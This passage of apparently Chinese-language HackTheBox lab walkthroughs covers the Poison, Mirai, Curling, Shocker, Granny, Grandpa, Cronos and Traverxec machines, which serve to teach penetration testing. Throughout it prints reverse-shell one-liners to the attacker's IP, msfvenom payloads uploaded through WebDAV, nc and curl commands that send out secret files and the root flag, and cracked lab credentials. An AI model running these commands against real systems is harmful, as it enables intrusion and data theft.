times.. what could go wrong really.. Vm0wd2QyUXlVWGxWV0d4WFlURndVRlpzWkZOalJsWjBUVlpPV0ZKc2JETlhhMk0xVmpKS1IySkVU bGhoTVVwVVZtcEdZV015U2tWVQpiR2hvVFZWd1ZWWnRjRWRUTWxKSVZtdGtXQXBpUm5CUFdWZDBS bVZHV25SalJYUlVUVlUxU1ZadGRGZFZaM0JwVmxad1dWWnRNVFJqCk1EQjRXa1prWVZKR1NsVlVW M040VGtaa2NtRkdaR2hWV0VKVVdXeGFTMVZHWkZoTlZGSlRDazFFUWpSV01qVlRZVEZLYzJOSVRs WmkKV0doNlZHeGFZVk5IVWtsVWJXaFdWMFZLVlZkWGVHRlRNbEY0VjI1U2ExSXdXbUZEYkZwelYy eG9XR0V4Y0hKWFZscExVakZPZEZKcwpaR2dLWVRCWk1GWkhkR0ZaVms1R1RsWmtZVkl5YUZkV01G WkxWbFprV0dWSFJsUk5WbkJZVmpKMGExWnRSWHBWYmtKRVlYcEdlVmxyClVsTldNREZ4Vm10NFYw MXVUak5hVm1SSFVqRldjd3BqUjJ0TFZXMDFRMkl4WkhOYVJGSlhUV3hLUjFSc1dtdFpWa2w1WVVa T1YwMUcKV2t4V2JGcHJWMGRXU0dSSGJFNWlSWEEyVmpKMFlXRXhXblJTV0hCV1ltczFSVmxzVm5k WFJsbDVDbVJIT1ZkTlJFWjRWbTEwTkZkRwpXbk5qUlhoV1lXdGFVRmw2UmxkamQzQlhZa2RPVEZk WGRHOVJiVlp6VjI1U2FsSlhVbGRVVmxwelRrWlplVTVWT1ZwV2EydzFXVlZhCmExWXdNVWNLVjJ0 NFYySkdjR2hhUlZWNFZsWkdkR1JGTldoTmJtTjNWbXBLTUdJeFVYaGlSbVJWWVRKb1YxbHJWVEZT Vm14elZteHcKVG1KR2NEQkRiVlpJVDFaa2FWWllRa3BYVmxadlpERlpkd3BOV0VaVFlrZG9hRlZz WkZOWFJsWnhVbXM1YW1RelFtaFZiVEZQVkVaawpXR1ZHV210TmJFWTBWakowVjFVeVNraFZiRnBW VmpOU00xcFhlRmRYUjFaSFdrWldhVkpZUW1GV2EyUXdDazVHU2tkalJGbExWRlZTCmMxSkdjRFpO Ukd4RVdub3dPVU5uUFQwSwo&#x3D; user flag然后直接ssh登录charix，得到user.txt: lfi to rce也可以通过前面的lfi去包含/var/log/httpd-access.log，然后UA里写php代码构造RCE，不过这样打到的是www，还是一样需要解出来密码切换到charix 提权信息secret用户目录有个secret.zip,下载下来： 12nc -lvvp 4445 &gt; secret.zipnc 10.10.14.18 4445 &lt; secret.zip zip解压需要密码，就是charix的密码Charix!2#4%6&amp;8(0 ： 得到一个secret文件，先放着： vnc查看端口发现本地开着5801，5901: 这是vnc相关端口，查看进程也能看到是root用户启动的vnc服务： 那么前面的secret应该就是vnc用的了，转发端口出来vnc访问 提权 &amp; root flag就是把端口转发出来，然后vnc指定密码文件访问，得到root.txt： 123ssh -L 10.211.55.2:5901:127.0.0.1:5901 charix@10.10.10.84vncviewer 10.211.55.2::5901 -passwd secret 参考资料 https://www.hackthebox.eu/home/machines/writeup/132 HackTheBox - Poison - YouTubehttps://www.youtube.com/watch?v=rs4zEwONzzk&amp;feature=emb_title&amp;ab_channel=IppSec","categories":[],"tags":[{"name":"HackTheBox","slug":"HackTheBox","permalink":"https://darkwing.moe/tags/HackTheBox/"}]},{"title":"Mirai - HackTheBox","slug":"Mirai-HackTheBox","date":"2020-02-09T04:49:31.000Z","updated":"2021-01-05T04:50:53.680Z","comments":true,"path":"2020/02/09/Mirai-HackTheBox/","link":"","permalink":"https://darkwing.moe/2020/02/09/Mirai-HackTheBox/","excerpt":"","text":"基本信息 https://www.hackthebox.eu/home/machines/profile/64 10.10.10.48 端口扫描22，53，80: 12345678910111213141516171819202122$ nmap -sC -sV 10.10.10.48Starting Nmap 7.91 ( https://nmap.org ) at 2021-01-05 11:06 CSTNmap scan report for 10.10.10.48Host is up (0.069s latency).Not shown: 997 closed portsPORT STATE SERVICE VERSION22/tcp open ssh OpenSSH 6.7p1 Debian 5+deb8u3 (protocol 2.0)| ssh-hostkey:| 1024 aa:ef:5c:e0:8e:86:97:82:47:ff:4a:e5:40:18:90:c5 (DSA)| 2048 e8:c1:9d:c5:43:ab:fe:61:23:3b:d7:e4:af:9b:74:18 (RSA)| 256 b6:a0:78:38:d0:c8:10:94:8b:44:b2:ea:a0:17:42:2b (ECDSA)|_ 256 4d:68:40:f7:20:c4:e5:52:80:7a:44:38:b8:a2:a7:52 (ED25519)53/tcp open domain dnsmasq 2.76| dns-nsid:|_ bind.version: dnsmasq-2.7680/tcp open http lighttpd 1.4.35|_http-server-header: lighttpd/1.4.35|_http-title: Site doesn't have a title (text/html; charset=UTF-8).Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernelService detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 33.27 seconds 80直接访问是空白页面： 目录扫描很容易扫到一个admin目录，访问是pi-hole,看起来是个树莓派: 1234➜ ~ gobuster dir -u http://10.10.10.48/ -w /usr/share/seclists/Discovery/Web-Content/common.txt -t 50/admin (Status: 301)/swfobject.js (Status: 200) raspberrypi &amp; user flag然后就是树莓派默认用户名密码直接登录进去,桌面得到user.txt： 1pi ： raspberry 提权信息sudo没有限制，root目录的root.txt提示backup在USB stick里： df -hdf可以看到usbstick是/dev/sdb: damnit.txt直接查看usbstick里面只有一个txt,内容是最近删掉了文件内容，需要恢复： root flag可以把sdb整个下载下来做恢复： 1sudo dcfldd if=/dev/sdb of=/home/pi/usb.dd 也可以简单的直接strings查看sdb，得到root flag： 参考资料 https://www.hackthebox.eu/home/machines/writeup/64 HackTheBox - Mirai - YouTubehttps://www.youtube.com/watch?v=SRmvRGUuuno&amp;feature=youtu.be&amp;ab_channel=IppSec","categories":[],"tags":[{"name":"HackTheBox","slug":"HackTheBox","permalink":"https://darkwing.moe/tags/HackTheBox/"}]},{"title":"Curling - HackTheBox","slug":"Curling-HackTheBox","date":"2020-02-08T08:19:17.000Z","updated":"2020-12-28T08:20:25.781Z","comments":true,"path":"2020/02/08/Curling-HackTheBox/","link":"","permalink":"https://darkwing.moe/2020/02/08/Curling-HackTheBox/","excerpt":"","text":"基本信息 https://www.hackthebox.eu/home/machines/profile/160 10.10.10.150 端口扫描22和80: 12345678910111213141516171819$ nmap -sC -sV 10.10.10.150Starting Nmap 7.91 ( https://nmap.org ) at 2020-12-28 15:25 CSTNmap scan report for 10.10.10.150Host is up (0.068s latency).Not shown: 998 closed portsPORT STATE SERVICE VERSION22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)| ssh-hostkey:| 2048 8a:d1:69:b4:90:20:3e:a7:b6:54:01:eb:68:30:3a:ca (RSA)| 256 9f:0b:c2:b2:0b:ad:8f:a1:4e:0b:f6:33:79:ef:fb:43 (ECDSA)|_ 256 c1:2a:35:44:30:0c:5b:56:6a:3f:a5:cc:64:66:d9:a9 (ED25519)80/tcp open http Apache httpd 2.4.29 ((Ubuntu))|_http-generator: Joomla! - Open Source Content Management|_http-server-header: Apache/2.4.29 (Ubuntu)|_http-title: HomeService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernelService detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 41.60 seconds 80是一个joomla，页面信息得到一个用户名，Floris，页面注释里secret.txt得到一个密码： secret.txt1234Q3VybGluZzIwMTgh$ echo &#39;Q3VybGluZzIwMTgh&#39; | base64 -dCurling2018! Joomla然后使用上面得到的用户名密码可以登录Joomla： 1Floris ： Curling2018! 这里出错也不影响后面操作： webshell就是编辑模板文件吗，修改php代码： Extentions &gt; Templates &gt; Templates &gt; Protosta: reverse shell注意编码，主要是&amp;编码为%26: 123rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.10.14.15 4445 &gt;/tmp/fpython3 -c \"import pty;pty.spawn('/bin/bash')\" 用户信息当前是www-data用户，需要到floris用户，在/home/floris目录有个password_backup文件，下载下来分析处理： 12nc -lvvp 4446 &gt; password_backupnc 10.10.14.15 4446 &lt; password_backup 查看password_backup是hexdump，后面就是查看内容，确认格式，解码流程(繁琐的流程，Cyberchef大法好)： 123456789101112131415161718$ cat password_backup | xxd -r &gt; bak$ file bakbak: bzip2 compressed data, block size = 900k$ bzip2 -d bakbzip2: Can't guess original name for bak -- using bak.out$ file bak.outbak.out: gzip compressed data, was \"password\", last modified: Tue May 22 19:16:20 2018, from Unix, original size modulo 2^32 141$ mv bak.out bak.gz$ gzip -d bak.gz$ file bakbak: bzip2 compressed data, block size = 900k$ bzip2 -d bakbzip2: Can't guess original name for bak -- using bak.out$ file bak.outbak.out: POSIX tar archive (GNU)$ tar xf bak.out$ cat password.txt5d&lt;wdCbdZu)|hChXll user flag得到的密码就是floris用户密码，直接ssh登录，得到user.txt: 提权信息123wget http://10.10.14.15:7777/pspy64chmod +x pspy64./pspy64 admin-area目录里有input和report,看起来report就是input里给出的地址的内容，并且pspy64结果显示是root定时通过curl读取input，将结果写入到report： 并且查看input和outout都是我们可写的，那么就可以任意读写文件 root flag只需要修改input，即可在report中看到root flag： 1url &#x3D; &quot;file:&#x2F;&#x2F;&#x2F;root&#x2F;root.txt&quot; 参考资料 HTB: Curling | 0xdf hacks stuffhttps://0xdf.gitlab.io/2019/03/30/htb-curling.html https://www.hackthebox.eu/home/machines/writeup/160 HackTheBox - Curling - YouTubehttps://www.youtube.com/watch?v=Paajc2Dupms&amp;feature=youtu.be&amp;ab_channel=IppSec","categories":[],"tags":[{"name":"HackTheBox","slug":"HackTheBox","permalink":"https://darkwing.moe/tags/HackTheBox/"}]},{"title":"Shocker - HackTheBox","slug":"Shocker-HackTheBox","date":"2020-02-07T06:51:27.000Z","updated":"2020-12-25T06:52:37.895Z","comments":true,"path":"2020/02/07/Shocker-HackTheBox/","link":"","permalink":"https://darkwing.moe/2020/02/07/Shocker-HackTheBox/","excerpt":"","text":"基本信息 https://www.hackthebox.eu/home/machines/profile/108 10.10.10.56 端口扫描80和2222: 123456789101112131415161718$ nmap -sC -sV 10.10.10.56Starting Nmap 7.91 ( https://nmap.org ) at 2020-12-25 14:16 CSTNmap scan report for 10.10.10.56Host is up (0.070s latency).Not shown: 998 closed portsPORT STATE SERVICE VERSION80/tcp open http Apache httpd 2.4.18 ((Ubuntu))|_http-server-header: Apache/2.4.18 (Ubuntu)|_http-title: Site doesn't have a title (text/html).2222/tcp open ssh OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)| ssh-hostkey:| 2048 c4:f8:ad:e8:f8:04:77:de:cf:15:0d:63:0a:18:7e:49 (RSA)| 256 22:8f:b1:97:bf:0f:17:08:fc:7e:2c:8f:e9:77:3a:48 (ECDSA)|_ 256 e6:ac:27:a3:b5:a9:f1:12:3c:34:a5:5d:5b:eb:3d:e9 (ED25519)Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernelService detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 29.98 seconds 80就一张图： 目录扫描目录扫描可以发现一个user.sh文件(一般字典还真没这个…)： 1234567891011➜ ~ gobuster dir -u http://10.10.10.56/ -w /usr/share/seclists/Discovery/Web-Content/common.txt -t 50.../cgi-bin/ (Status: 403)/index.html (Status: 200)/server-status (Status: 403)...➜ ~ gobuster dir -u http://10.10.10.56/cgi-bin/ -w /usr/share/seclists/Discovery/DNS/dns-Jhaddix.txt -t 50.../user.sh (Status: 200)... user.sh12345Content-Type: text/plainJust an uptime test script 01:21:49 up 6 min, 0 users, load average: 0.24, 0.07, 0.02 CVE-2014-6271cgi里sh脚本，可以想到是apache的mod_cgi,就是CVE-2014-6271 ShellShock漏洞，msf一键打： 123msf6 &gt; use exploit/multi/http/apache_mod_cgi_bash_env_execset rhosts 10.10.10.56set targeturi /cgi-bin/user.sh user flag当前是shelly用户，在用户目录得到user.txt: 提权信息可以无需密码sudo执行perl，利用方式： https://gtfobins.github.io/gtfobins/perl/ 提权 &amp; root flag然后直接提权，读取root.txt: 参考资料 https://gtfobins.github.io/gtfobins/perl/ https://www.hackthebox.eu/home/machines/writeup/108 HackTheBox - Shocker - YouTubehttps://www.youtube.com/watch?v=IBlTdguhgfY&amp;feature=youtu.be&amp;ab_channel=IppSec","categories":[],"tags":[{"name":"HackTheBox","slug":"HackTheBox","permalink":"https://darkwing.moe/tags/HackTheBox/"}]},{"title":"Granny - HackTheBox","slug":"Granny-HackTheBox","date":"2020-02-06T06:00:11.000Z","updated":"2020-12-25T06:01:42.734Z","comments":true,"path":"2020/02/06/Granny-HackTheBox/","link":"","permalink":"https://darkwing.moe/2020/02/06/Granny-HackTheBox/","excerpt":"","text":"基本信息 https://www.hackthebox.eu/home/machines/profile/14 10.10.10.15 端口扫描只有一个80: 12345678910111213141516171819202122232425262728$ nmap -sC -sV 10.10.10.15Starting Nmap 7.91 ( https://nmap.org ) at 2020-12-25 13:29 CSTNmap scan report for 10.10.10.15Host is up (0.068s latency).Not shown: 999 filtered portsPORT STATE SERVICE VERSION80/tcp open http Microsoft IIS httpd 6.0| http-methods:|_ Potentially risky methods: TRACE DELETE COPY MOVE PROPFIND PROPPATCH SEARCH MKCOL LOCK UNLOCK PUT| http-ntlm-info:| Target_Name: GRANNY| NetBIOS_Domain_Name: GRANNY| NetBIOS_Computer_Name: GRANNY| DNS_Domain_Name: granny| DNS_Computer_Name: granny|_ Product_Version: 5.2.3790|_http-server-header: Microsoft-IIS/6.0|_http-title: Under Construction| http-webdav-scan:| Server Date: Fri, 25 Dec 2020 05:30:23 GMT| Public Options: OPTIONS, TRACE, GET, HEAD, DELETE, PUT, POST, COPY, MOVE, MKCOL, PROPFIND, PROPPATCH, LOCK, UNLOCK, SEARCH| WebDAV type: Unknown| Server Type: Microsoft-IIS/6.0|_ Allowed Methods: OPTIONS, TRACE, GET, HEAD, DELETE, COPY, MOVE, PROPFIND, PROPPATCH, SEARCH, MKCOL, LOCK, UNLOCKService Info: OS: Windows; CPE: cpe:/o:microsoft:windowsService detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 56.88 seconds 80IIS默认页面： WebDAV和grandpa基本一样的环境，可以换个方式从webdav打： davtestdavtest显示可以不能直接put asp，可以put txt后MOVE： 1234567891011121314151617181920212223242526272829303132333435363738394041424344➜ ~ davtest --url http://10.10.10.15******************************************************** Testing DAV connectionOPEN SUCCEED: http://10.10.10.15********************************************************NOTE Random string for this session: 6YBKu7grFOa_YTc******************************************************** Creating directoryMKCOL SUCCEED: Created http://10.10.10.15/DavTestDir_6YBKu7grFOa_YTc******************************************************** Sending test filesPUT php SUCCEED: http://10.10.10.15/DavTestDir_6YBKu7grFOa_YTc/davtest_6YBKu7grFOa_YTc.phpPUT asp FAILPUT cfm SUCCEED: http://10.10.10.15/DavTestDir_6YBKu7grFOa_YTc/davtest_6YBKu7grFOa_YTc.cfmPUT pl SUCCEED: http://10.10.10.15/DavTestDir_6YBKu7grFOa_YTc/davtest_6YBKu7grFOa_YTc.plPUT aspx FAILPUT jhtml SUCCEED: http://10.10.10.15/DavTestDir_6YBKu7grFOa_YTc/davtest_6YBKu7grFOa_YTc.jhtmlPUT cgi FAILPUT html SUCCEED: http://10.10.10.15/DavTestDir_6YBKu7grFOa_YTc/davtest_6YBKu7grFOa_YTc.htmlPUT txt SUCCEED: http://10.10.10.15/DavTestDir_6YBKu7grFOa_YTc/davtest_6YBKu7grFOa_YTc.txtPUT jsp SUCCEED: http://10.10.10.15/DavTestDir_6YBKu7grFOa_YTc/davtest_6YBKu7grFOa_YTc.jspPUT shtml FAIL******************************************************** Checking for test file executionEXEC php FAILEXEC cfm FAILEXEC pl FAILEXEC jhtml FAILEXEC html SUCCEED: http://10.10.10.15/DavTestDir_6YBKu7grFOa_YTc/davtest_6YBKu7grFOa_YTc.htmlEXEC txt SUCCEED: http://10.10.10.15/DavTestDir_6YBKu7grFOa_YTc/davtest_6YBKu7grFOa_YTc.txtEXEC jsp FAIL********************************************************/usr/bin/davtest Summary:Created: http://10.10.10.15/DavTestDir_6YBKu7grFOa_YTcPUT File: http://10.10.10.15/DavTestDir_6YBKu7grFOa_YTc/davtest_6YBKu7grFOa_YTc.phpPUT File: http://10.10.10.15/DavTestDir_6YBKu7grFOa_YTc/davtest_6YBKu7grFOa_YTc.cfmPUT File: http://10.10.10.15/DavTestDir_6YBKu7grFOa_YTc/davtest_6YBKu7grFOa_YTc.plPUT File: http://10.10.10.15/DavTestDir_6YBKu7grFOa_YTc/davtest_6YBKu7grFOa_YTc.jhtmlPUT File: http://10.10.10.15/DavTestDir_6YBKu7grFOa_YTc/davtest_6YBKu7grFOa_YTc.htmlPUT File: http://10.10.10.15/DavTestDir_6YBKu7grFOa_YTc/davtest_6YBKu7grFOa_YTc.txtPUT File: http://10.10.10.15/DavTestDir_6YBKu7grFOa_YTc/davtest_6YBKu7grFOa_YTc.jspExecutes: http://10.10.10.15/DavTestDir_6YBKu7grFOa_YTc/davtest_6YBKu7grFOa_YTc.htmlExecutes: http://10.10.10.15/DavTestDir_6YBKu7grFOa_YTc/davtest_6YBKu7grFOa_YTc.txt exploit那就msf生成asp shell，put，move，访问触发： 12345msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.6 LPORT=4445 -f asp &gt; miao.txt# msfvenom -p windows/meterpreter/reverse_tcp_allports LHOST=10.10.14.6 LPORT=4445 -f asp &gt; miao.txtcurl -T 'miao.txt' http://10.10.10.15/miao.txt # 上传txt文件到granny服务上curl -X MOVE --header 'Destination:http://10.10.10.15/miao.asp' 'http://10.10.10.15/miao.txt' # txt改名aspcurl 'http://10.10.10.15/miao.asp' # 访问asp文件触发shell 提权提权也是一样，post/multi/recon/local_exploit_suggester， 然后随便选一个： flags然后就是读取flag： 1234567891011meterpreter &gt; search -f user.txtFound 1 result... c:\\Documents and Settings\\Lakis\\Desktop\\user.txt (32 bytes)meterpreter &gt; search -f root.txtFound 1 result... c:\\Documents and Settings\\Administrator\\Desktop\\root.txt (32 bytes)meterpreter &gt; cd 'c:\\Documents and Settings'meterpreter &gt; cat Lakis/Desktop/user.txtmeterpreter &gt; cat Administrator/Desktop/root.txt 参考资料 HTB: Granny | 0xdf hacks stuffhttps://0xdf.gitlab.io/2019/03/06/htb-granny.html#webdav https://www.hackthebox.eu/home/machines/writeup/14 HackTheBox - Granny and Grandpa - YouTubehttps://www.youtube.com/watch?v=ZfPVGJGkORQ&amp;feature=youtu.be&amp;ab_channel=IppSec","categories":[],"tags":[{"name":"HackTheBox","slug":"HackTheBox","permalink":"https://darkwing.moe/tags/HackTheBox/"}]},{"title":"Grandpa - HackTheBox","slug":"Grandpa-HackTheBox","date":"2020-02-05T08:41:58.000Z","updated":"2020-12-24T08:43:32.855Z","comments":true,"path":"2020/02/05/Grandpa-HackTheBox/","link":"","permalink":"https://darkwing.moe/2020/02/05/Grandpa-HackTheBox/","excerpt":"","text":"基本信息 https://www.hackthebox.eu/home/machines/profile/13 10.10.10.14 端口扫描就一个80: 123456789101112131415161718192021$ nmap -sC -sV 10.10.10.14Starting Nmap 7.91 ( https://nmap.org ) at 2020-12-24 15:35 CSTNmap scan report for 10.10.10.14Host is up (0.069s latency).Not shown: 999 filtered portsPORT STATE SERVICE VERSION80/tcp open http Microsoft IIS httpd 6.0| http-methods:|_ Potentially risky methods: TRACE COPY PROPFIND SEARCH LOCK UNLOCK DELETE PUT MOVE MKCOL PROPPATCH|_http-server-header: Microsoft-IIS/6.0|_http-title: Under Construction| http-webdav-scan:| WebDAV type: Unknown| Public Options: OPTIONS, TRACE, GET, HEAD, DELETE, PUT, POST, COPY, MOVE, MKCOL, PROPFIND, PROPPATCH, LOCK, UNLOCK, SEARCH| Server Date: Thu, 24 Dec 2020 07:36:12 GMT| Server Type: Microsoft-IIS/6.0|_ Allowed Methods: OPTIONS, TRACE, GET, HEAD, COPY, PROPFIND, SEARCH, LOCK, UNLOCKService Info: OS: Windows; CPE: cpe:/o:microsoft:windowsService detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 72.41 seconds 80IIS 6.0,默认建设中页面： #CVE-2017-7269 搜索得到： Microsoft IIS 6.0 - WebDAV ‘ScStoragePathFromUrl’ Remote Buffer Overflow - Windows remote Exploithttps://www.exploit-db.com/exploits/41738 msf有模块直接一键打,拿到的是network service权限shel(因为是BOF，很容易把服务打挂，显示错误就reset机器吧)l： 提权信息然后直接用local_exploit_suggester： 提权随便选一个，打就完事了，打之前需要mighrate到一个标准进程： 打完之后我们的service shell就变成system了： flags然后直接去读取flag： 1234567891011meterpreter &gt; search -f user.txtFound 1 result... c:\\Documents and Settings\\Harry\\Desktop\\user.txt (32 bytes)meterpreter &gt; search -f root.txtFound 1 result... c:\\Documents and Settings\\Administrator\\Desktop\\root.txt (32 bytes)meterpreter &gt;meterpreter &gt; cd 'C:\\Documents and Settings'cat Harry/Desktop/user.txtcat Administrator/Desktop/root.txt 参考资料 Microsoft IIS 6.0 - WebDAV ‘ScStoragePathFromUrl’ Remote Buffer Overflow - Windows remote Exploithttps://www.exploit-db.com/exploits/41738 HTB: Grandpa | 0xdf hacks stuffhttps://0xdf.gitlab.io/2020/05/28/htb-grandpa.html#shell-as-network-service https://www.hackthebox.eu/home/machines/writeup/13 HackTheBox - Granny and Grandpa - YouTubehttps://www.youtube.com/watch?v=ZfPVGJGkORQ&amp;feature=youtu.be&amp;ab_channel=IppSec","categories":[],"tags":[{"name":"HackTheBox","slug":"HackTheBox","permalink":"https://darkwing.moe/tags/HackTheBox/"}]},{"title":"Cronos - HackTheBox","slug":"Cronos-HackTheBox","date":"2020-02-04T07:16:07.000Z","updated":"2020-12-24T07:17:44.480Z","comments":true,"path":"2020/02/04/Cronos-HackTheBox/","link":"","permalink":"https://darkwing.moe/2020/02/04/Cronos-HackTheBox/","excerpt":"","text":"基本信息 https://www.hackthebox.eu/home/machines/profile/11 10.10.10.13 端口扫描22,53,80: 123456789101112131415161718192021$ nmap -sC -sV 10.10.10.13Starting Nmap 7.91 ( https://nmap.org ) at 2020-12-24 14:15 CSTNmap scan report for 10.10.10.13Host is up (0.069s latency).Not shown: 997 filtered portsPORT STATE SERVICE VERSION22/tcp open ssh OpenSSH 7.2p2 Ubuntu 4ubuntu2.1 (Ubuntu Linux; protocol 2.0)| ssh-hostkey:| 2048 18:b9:73:82:6f:26:c7:78:8f:1b:39:88:d8:02:ce:e8 (RSA)| 256 1a:e6:06:a6:05:0b:bb:41:92:b0:28:bf:7f:e5:96:3b (ECDSA)|_ 256 1a:0e:e7:ba:00:cc:02:01:04:cd:a3:a9:3f:5e:22:20 (ED25519)53/tcp open domain ISC BIND 9.10.3-P4 (Ubuntu Linux)| dns-nsid:|_ bind.version: 9.10.3-P4-Ubuntu80/tcp open http Apache httpd 2.4.18 ((Ubuntu))|_http-server-header: Apache/2.4.18 (Ubuntu)|_http-title: Apache2 Ubuntu Default Page: It worksService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernelService detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 65.37 seconds DNS域传送53端口dns服务存在dns域传送漏洞，初始域名需要简单猜一下，cronos.htb： 12345678910111213141516$ dig axfr @10.10.10.13 cronos.htb; &lt;&lt;&gt;&gt; DiG 9.10.6 &lt;&lt;&gt;&gt; axfr @10.10.10.13 cronos.htb; (1 server found);; global options: +cmdcronos.htb. 604800 IN SOA cronos.htb. admin.cronos.htb. 3 604800 86400 2419200 604800cronos.htb. 604800 IN NS ns1.cronos.htb.cronos.htb. 604800 IN A 10.10.10.13admin.cronos.htb. 604800 IN A 10.10.10.13ns1.cronos.htb. 604800 IN A 10.10.10.13www.cronos.htb. 604800 IN A 10.10.10.13cronos.htb. 604800 IN SOA cronos.htb. admin.cronos.htb. 3 604800 86400 2419200 604800;; Query time: 69 msec;; SERVER: 10.10.10.13#53(10.10.10.13);; WHEN: Thu Dec 24 14:21:15 CST 2020;; XFR size: 7 records (messages 1, bytes 203) 然后得到的域名加hosts： 110.10.10.13 cronos.htb admin.cronos.htb ns1.cronos.htb www.cronos.htb admin.cronos.htb应该是管理后台，需要登录： sql注入基础的sql注入，直接admin&#39; or &#39;1&#39;=&#39;1就能进去： 命令注入然后这功能一看就是基础的命令注入： reverse shell服务器有nc，没有-e选项，这种方式就可以： 123rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.10.14.12 4445 &gt;/tmp/fpython -c 'import pty; pty.spawn(\"/bin/bash\")' user flag然后当前shell切换到用户目录，得到user.txt: 提权信息 直接上脚本搜集信息： https://github.com/rebootuser/LinEnum 123wget http://10.10.14.12:7777/LinEnum.shchmod +x LinEnum.sh./LinEnum.sh 很容易看到root权限的定时任务，每分钟执行一次/var/www/laravel/app/Console/Kernel.php中的schedule函数，而这个文件是我们可写的,根据文档，可以修改代码执行任意命令： 任务调度 |《Laravel 8 中文文档 8.x》| Laravel China 社区https://learnku.com/docs/laravel/8.x/scheduling/9399 Kernel.php12345678910111213141516171819202122232425262728293031323334353637383940&lt;?phpnamespace App\\Console;use Illuminate\\Console\\Scheduling\\Schedule;use Illuminate\\Foundation\\Console\\Kernel as ConsoleKernel;class Kernel extends ConsoleKernel&#123; /** * The Artisan commands provided by your application. * * @var array */ protected $commands = [ // ]; /** * Define the application's command schedule. * * @param \\Illuminate\\Console\\Scheduling\\Schedule $schedule * @return void */ protected function schedule(Schedule $schedule) &#123; // $schedule-&gt;command('inspire') // -&gt;hourly(); &#125; /** * Register the Closure based commands for the application. * * @return void */ protected function commands() &#123; require base_path('routes/console.php'); &#125;&#125; 提权 &amp; root flag直接覆盖文件，自定义命令，得到root.txt: 12345// $schedule-&gt;exec('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.10.14.12 4446 &gt;/tmp/f')-&gt;everyMinute();$schedule-&gt;exec(\"curl http://10.10.14.12:7777/`cat /root/root.txt`\")-&gt;everyMinute();rm Kernel.phpwget http://10.10.14.12:7777/Kernel.php 参考资料 https://github.com/rebootuser/LinEnum 任务调度 |《Laravel 8 中文文档 8.x》| Laravel China 社区https://learnku.com/docs/laravel/8.x/scheduling/9399 https://www.hackthebox.eu/home/machines/writeup/11 HackTheBox - CronOS - YouTubehttps://www.youtube.com/watch?v=CYeVUmOar3I&amp;feature=youtu.be&amp;ab_channel=IppSec","categories":[],"tags":[{"name":"HackTheBox","slug":"HackTheBox","permalink":"https://darkwing.moe/tags/HackTheBox/"}]},{"title":"Traverxec - HackTheBox","slug":"Traverxec-HackTheBox","date":"2020-02-03T06:30:09.000Z","updated":"2020-12-23T06:35:25.984Z","comments":true,"path":"2020/02/03/Traverxec-HackTheBox/","link":"","permalink":"https://darkwing.moe/2020/02/03/Traverxec-HackTheBox/","excerpt":"","text":"基本信息 https://www.hackthebox.eu/home/machines/profile/217 10.10.10.165 端口扫描常规的22，80； 12345678910111213141516171819$ nmap -sC -sV -Pn 10.10.10.165Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.Starting Nmap 7.91 ( https://nmap.org ) at 2020-12-23 13:43 CSTNmap scan report for 10.10.10.165Host is up (0.067s latency).Not shown: 998 filtered portsPORT STATE SERVICE VERSION22/tcp open ssh OpenSSH 7.9p1 Debian 10+deb10u1 (protocol 2.0)| ssh-hostkey:| 2048 aa:99:a8:16:68:cd:41:cc:f9:6c:84:01:c7:59:09:5c (RSA)| 256 93:dd:1a:23:ee:d7:1f:08:6b:58:47:09:73:a3:88:cc (ECDSA)|_ 256 9d:d6:62:1e:7a:fb:8f:56:92:e6:37:f1:10:db:9b:ce (ED25519)80/tcp open http nostromo 1.9.6|_http-server-header: nostromo 1.9.6|_http-title: TRAVERXECService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernelService detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 55.09 seconds 80随意构造报错得到server信息，直接看header也可以，nostromo： nostromo这个server有已知漏洞： nostromo 1.9.6 - Remote Code Execution - Multiple remote Exploithttps://www.exploit-db.com/exploits/47837 theRealFr13nd/CVE-2019-16278-Nostromo_1.9.6-RCE: Python script to exploit RCE in Nostromo nhttpd &lt;= 1.9.6.https://github.com/theRealFr13nd/CVE-2019-16278-Nostromo_1.9.6-RCE www-data shell服务器有nc，直接reverse shell 123python CVE-2019-16278.py -t 10.10.10.165 -p 80 -c \"nc -e bash 10.10.14.11 4445\"python -c 'import pty;pty.spawn(\"/bin/bash\")' 信息搜集因为是nostromo，首先去看下配置文件/var/nostromo/conf/nhttpd.conf,知道www目录，然后去查看相关目录,发现一个压缩包： 12ls -al /home/david/public_www/ls -al /home/david/public_www/protected-file-area backup-ssh-identity-files.tgz12345678nc -lvvp 4446 &gt; backup.tgznc 10.10.14.11 4446 &lt; /home/david/public_www/protected-file-area/backup-ssh-identity-files.tgz$ tar -xvf backup.tgzx home/david/.ssh/x home/david/.ssh/authorized_keysx home/david/.ssh/id_rsax home/david/.ssh/id_rsa.pub 拿到了davia用户的ssh私钥，但不能直接使用，需要密码： ssh passphrase crack破解出来密码，hunter 1234567891011121314python3 /usr/share/john/ssh2john.py id_rsa &gt; hash.txtsudo john --wordlist=/usr/share/wordlists/rockyou.txt hash.txtUsing default input encoding: UTF-8Loaded 1 password hash (SSH [RSA/DSA/EC/OPENSSH (SSH private keys) 32/64])Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 